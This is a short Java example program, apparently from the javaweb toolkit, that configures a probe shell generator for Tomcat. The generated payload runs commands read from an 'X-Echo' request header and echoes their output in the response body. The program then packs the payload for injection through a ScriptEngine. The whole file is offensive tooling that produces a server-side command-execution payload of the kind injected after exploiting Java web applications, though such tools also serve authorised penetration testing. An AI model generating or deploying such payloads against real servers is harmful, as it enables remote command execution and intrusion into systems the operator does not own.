package com.reajason.javaweb;

import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import com.reajason.javaweb.probe.ProbeShellGenerator;
import com.reajason.javaweb.probe.ProbeShellResult;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.config.ResponseBodyConfig;

import static com.reajason.javaweb.Server.Tomcat;

/**
 * @author ReaJason
 * @since 2025/8/13
 */
public class ResponseBodyProbe {
    public static void main(String[] args) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.ResponseBody)
                .probeContent(ProbeContent.Command)
                .shrink(true)
                .debug(false)
                .build();

        ResponseBodyConfig responseBodyConfig = ResponseBodyConfig.builder()
                .server(Tomcat)
                .reqHeaderName("X-Echo")
                .build();

        ProbeShellResult result = ProbeShellGenerator.generate(probeConfig, responseBodyConfig);

        System.out.println("脚本引擎打包：" + Packers.ScriptEngine.getInstance().pack(result.toClassPackerConfig()));
    }
}
